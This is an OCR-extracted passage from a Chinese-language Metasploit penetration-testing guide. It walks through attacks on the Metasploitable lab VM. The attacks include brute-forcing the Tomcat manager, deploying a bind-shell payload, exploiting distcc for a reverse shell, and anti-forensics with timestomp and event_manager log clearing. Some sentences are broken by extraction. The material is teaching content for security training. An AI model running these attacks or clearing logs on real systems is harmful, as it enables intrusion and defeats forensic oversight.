[*] Auxiliary module execution completed
msf auxiliary(smtp_version)>
从上面你可以看到，Metasploitable服务器上看起来运行着Postfix电子邮件服务。
大量的辅助模块对于此项工作是非常由帮助的，当你完成后，应该已经获得了在目标系统
上所运行的软件版本的列表，而这些信息将在选择哪种攻击方式时起到关键作用。
17.7攻击ApacheTomcat
现在我们再次伸出我们的魔爪，重新进入到渗透攻击环节。
在我们前面所做的研究功课中，已经在目标系统上注意到了一堆的安全漏洞，包括直接的
渗透攻击和一些可能的暴力破解。现在，由于进行的是-一次白盒测试，故可以对目标系统运行
趣。现在让我们首先试试Apache。
根据之前的端口扫描结果，注意到ApacheTomcat安装在8180端口上，通过一些简单的互
联网查询，我们了解到Tomcat的管理接口存在着一个暴力破解漏洞（在大多数情况下，我们可
Tomcat服务版本号进行进一步确认之后，我们发现对Tomcat管理器进行攻击看起来是攻陷系
统最佳的攻击途径之一。如果可以获得Tomcat管理器的功能，就可以使用HTTP的PUT方法
260
---
## Page 288
第17章一次模拟的渗透测试过程
在目标系统上植入攻击载荷。我们如下来启动这次渗透攻击（裁剪了一些攻击和攻击载荷的
输出)。
msf>searchapache
...SNIP..，
msfauxiliary(tomcat_mgr_login)>setRHosTS172.16.32.162
RHOSTS => 172.16.32.162
Smsf auxiliary(tomcat_mgr_login) > set THREADS 50
THREADS => 50
msf auxiliary(tomcat_mgr_login) > set RPoRT 8180
RPORT => 8180
msf auxiliary(tomcat_mgr_login) > set VERBoSE false
VERBOSE =>false
emsf auxiliary(tomcat_mgr_login) > run
[+]http://172.16.32.162:8180/manager/html [Apache-Coyote/1.1][Tomcat Application Manager]
successful login'tomcat':'tomcat'
[*]Scanned 1 of 1 hosts (100% complete)
[*]Auxiliary module execution completed
msf auxiliary(tomcat_mgr_login)>
我们的暴力破解成功了，Metasploit成功地以猜测到的用户名tomcat和口令tomcat登录到
了Tomcat管理器上，但并没有得到一个Shell。
利用我们新发现到的口令信息，利用multi/http/tomcat_mgr_deploy渗透攻击模块中提供的
Apache的HTTPPUT功能，向目标系统植入我们的攻击载荷。
auxiliary(tomcat_mgr_login) > use multi/http/tomcat_mgr_deploy
msf exploit(tomcat_mgr_deploy)>setpassword tomcat
password => tomcat
msf exploit(tomcat_mgr_deploy)>set username tomcat
username =>tomcat
msf exploit(tomcat_mgr_deploy)>set RH0ST 172.16.32.162
RHOST => 172.16.32.162
msf exploit(tomcat_mgr_deploy) > set LPORT 9999
LPORT => 9999
Msf exploit(tomcat_mgr_deploy)> set RPoRT 8180
RPORT=>8180
msf exploit(tomcat_mgr_deploy) > set payload linux/x86/shell_bind_tcp
payload => linux/x86/shell_bind_tcp
msf exploit(tomcat_mgr_deploy) > exploit
[*]Started bind handler
261
---
## Page 289
Metasploit渗透测试指南
[*]Executing/FW36owipzcnHeUyIUaX/UGMIdfFjVENQOp4VveswTlma.jsp..
[*]UndeployingFW36owipzcnHeUyIUaX
[*]Command she1l session 1 opened (172.16.32.129:43474 -> 172.16.32.162:9999) at 2010-05-
2123:57:47 -0400msf
1s
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
opt
proc
root
sbin
srv
sys
tmp
uSr
var
vmlinuz
whoami
tomcat55
1s /root
reset_logs.sh
mkdir/root/moo.txt
mkdir:cannot create directory'/root/moo.txt':Permission denied
注意：我们不能往root目录下写入文件，因为获取到的是一个受限的用户账号，然而该目
录是需要根用户级别的权限的。通常情况下，Apache服务是以Apache用户账户如apache、httpd、
www-data等来运行的。基于我们已经对目标主机的操作系统版本的了解，可以进-步使用本地
一种不同的攻击途径吧。
提示：下面是无需通过特权提升攻击，就可以在Metasploitable上获得root访问权的一些
技巧提示：SSH可预测的伪随机数生成器渗透攻击http://www.exploit-db.com/exploits/5720/.
17.8攻击一个偏门的服务
当仅仅进行一次默认的nmap端口扫描，我们并没有找出目标系统上所有可能开放的端口。
但由于我们现在已经取得了对系统的初始访问权，可以输入netstat-antp命令，可以发现nmap
262
---
## Page 290
第17章一次模拟的渗透测试过程
没有扫描出来的一些其他端口。（记住在一次渗透测试中，我们不能总是依靠默认运行参数，它
们有时会失败）
我们发现到端口3632是开放的并关联到DistCC服务，对其进行在线搜索告诉我们DistCC
是一个能够在网络中多台机器间相互分发C/C++代码库的服务程序，而且存在着安全漏洞（当
你执行渗透测试时，会经常遭遇到你所不熟悉的应用程序和产品，需要在攻击它们深入地研究
这些目标)。
msf exploit(distcc_exec）> set payload linux/x86/shell_reverse_tcp
payload => linux/x86/shell_reverse_tcp
msf exploit(distcc_exec)>set LHoST 172.16.32.129
LHOST => 172.16.32.129
shomsf exploit(distcc_exec) > set RH0ST 172.16.32.162
RHOST => 172.16.32.162
msf exploit(distcc_exec)> show payloads
CompatiblePayloads
Name
Rank
Description
cmd/unix/bind_perl
normal
Unix Command Shell，Bind TCP (via perl)
cmd/unix/bind_ruby
Unix Command Shell, Bind TCP (via Ruby)
Cmd/unix/generic
normal
Unix Command,Generic command execution
cmd/unix/reverse
normal
Unix CommandShell,Doublereverse TCP（telnet)
cmd/unix/reverse_perl
Unix Command Shell,Reverse TCP (via perl)
cmd/unix/reverse_ruby
tewtou
1 Unix Command Shell, Reverse TCP (via Ruby)
msf exploit(distcc_exec)>set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf exploit(distcc_exec)>exploit
[*]Started reverse double handler
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*]Command:echo q6Td9oaTrOkXsBXS;
[*]  Writing to socket A
[*]Writing to socket B
[*] Reading from sockets..
[*]Reading from socket A
[*]A:"q6Td9oaTrOkXsBXS\r\n"
[*] Matching...
[*]B is input..
[*] Command shell session 2 opened (172.16.32.129:4444 -> 172.16.32.162:47002) at 2010-05-
22 00:08:04 -0400
whoami
daemon
mkdir/root/moo
mkdir:cannot create directory'/root/moo':Permission denied
263
---
## Page 291
Metasploit渗透测试指南
注意：我们仍然没有拿到root。一次本地提升攻击可以进一步攻陷系统并取得完全的根用
户访问。我们在这里并不会直接给你答案，请使用你在本书中所学到的技能在Metasploitable系
统上成功获取root权限。一个提示是你可以从Expoit-db上找到相关的渗透代码。接受挑战，
试试自己来取得这台机器上的根用户权限Linux或Meterpretershell吧。
17.9隐藏你的踪迹
在完成我们的攻击后，下一步就是要回到每个被攻陷的系统上，来清除我们的踪迹，收拾
所有遗留下的东西，特别时要移除掉诸如Meterpreter shell、恶意代码与攻击软件等，以避免在
目标系统上开放更多的攻击通道。举例来说，当我们使用了PUT方法来攻陷一台ApacheTomcat
实例，其他的攻击者可能会使用遗留在上面的渗透代码来攻陷系统。
有些时候，你需要隐藏你的踪迹，比如在客户单位测试攻陷系统的取证分析或入侵响应能
力时。在这种情况下，你的目标是要让任何取证分析或入侵检测系统失灵。通常情况下很难隐
藏你所有的踪迹，但可以操纵系统来诱导那些进行取证分析的人员，使他几乎不可能识别出你
的攻击范围。
在多数情况下，在开展取证分析时，如果你先前能够搞乱整个系统让取证分析者所依赖的
数据无法读取或变得混乱不堪，那他很可能只能识别出系统已经遭遇感染或攻陷，但无法了解
到你从系统中获取到了哪些信息。对抗取证分析最佳的方法是将整个系统完全重建并去除所有
的入侵踪迹，但这在渗透测试过程中往往是很少见的。
势。通常情况下，你会发现在内存空间中检测并应对Meterpreter还是很具挑战性的，尽管最新
Meterpreter的新方法来进行回击。
器或新的混淆方法发布后，厂商将会花上几个月的时间来检测出这些问题，并更新它们的产品
特征库来具备检测能力。在大多数情况下，取证分析者识别从Metasploit发起的完全处在内存
中的渗透攻击还是相当困难的。
我们将不会提供隐藏你的踪迹更为深入的信息，但是在Metasploit中的几个特性是非常值
得提及的：timestomp和event_manager。Timestomp是一个Meterpreter的插件，可以支持你去修
改、删除文件或设置文件的特定属性。我们先来运行下timestomp:
meterpreter>timestomp
Usage:timestompfile_pathOPTIoNS
264
---
## Page 292
第17章一次模拟的渗透测试过程
OPTIONS:
-a
Set the "last accessed"time of the file
-b
Set the MACE timestamps so that EnCase shows bIanks
-C
Set the"creation"time of the file
-e
Set the"mft entry modified"time of the file
-f
Set the MACE of attributes equal to the supplied file
-h
Help banner
-m
Set the"last written"time of the file
-r
Set the MACE timestamps recursively on a directory
-V
Display the UTC MACE values of the file
-z
Set all four attributes(MACE)of the file
meterpreter > timestomp C:\\boot.ini -b
[*] Blanking file MACE attributes on C:\boot.ini
meterpreter>
在上述例子中，我们修改了时间戳，使得当取证分析者使用一个流行的取证分析工具Encase
时，这些时间戳都会显示为空白。
而event_manager工具则会修改事件日志，使得它们不再显示哪些可能会揭示出攻击发生
的任何信息：
meterpreter>run event_manager
Meterpreter Script for Windows Event Log Query and Clear.
OPTIONS:
-C
Clear a given Event Log (or ALL if no argument specified)
-f
Event ID tofilter events on
-h
Help menu
-i
Show information about Event Logs on the System and their configuration
-1l
List a given Event Log.
-p
Supress printing filtered logs to screen
-S
Save logs to local CSv file, optionally specify alternate folder in which to
save logs
meterpreter>run event_manager -c
[-] You must specify an eventlog to query!
[*]Application:
[*] Clearing Application
[*] Event Log Application Cleared!
[*]MailCarrier 2.0:
[*] Clearing MailCarrier 2.0
[*] Event Log MailCarrier 2.o Cleared!
[*]Security:
[*]Clearing Security
[*] Event Log Security Cleared!
[*]System:
[*] Clearing System
[*] Event Log System Cleared!
meterpreter>
265
---
## Page 293
Metasploit渗透测试指南